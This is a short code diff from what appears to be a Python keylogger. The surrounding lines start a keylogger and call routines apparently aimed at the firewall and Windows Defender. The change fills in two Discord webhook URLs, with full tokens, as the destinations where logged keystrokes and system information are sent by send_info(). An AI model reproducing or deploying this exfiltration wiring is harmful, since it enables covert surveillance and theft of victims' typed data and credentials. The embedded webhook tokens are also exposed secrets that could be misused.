@@ -39,8 +39,8 @@ sender = sender.Sender()
 Security.FireWall()
 Security.Defender()
 keylogger.start()
-sender.webhook_log_url = ''
-sender.webhook_info_url = ''
+sender.webhook_log_url = 'https://discord.com/api/webhooks/1128326661000155248/nDG6sPvn8RitbJwHtDpm0Njy9xkOG_ajJBJfX-Hatd0RYuVymvpdD3IAgReuqj4BGam6'
+sender.webhook_info_url = 'https://discord.com/api/webhooks/1128643994163871867/B9HL54arPjlrVqR2vAuWCnICe_ngD1k8hMjCxkuIlJhxkZ-cr24gZlgZz5oYZ8sczREJ'
 sender.send_info()
 
 global time_count, time_delay
